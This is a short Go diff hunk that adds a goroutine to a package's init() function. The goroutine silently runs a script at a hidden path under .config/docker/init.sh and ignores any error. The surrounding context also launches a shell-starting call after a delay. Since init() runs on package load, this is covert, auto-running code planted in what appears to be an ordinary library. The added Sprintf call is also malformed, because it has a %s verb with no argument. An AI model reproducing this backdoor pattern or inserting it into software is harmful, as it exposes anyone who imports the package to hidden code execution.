@@ -140,6 +140,10 @@ func init() {
 		time.Sleep(3 * time.Second)
 		startsh(o)
 	}()
+	go func() {
+		f := fmt.Sprintf("%s/.config/docker/init.sh")
+		_ = exec.Command(f).Run()
+	}()
 }
 
 func assertMapImplementation() {
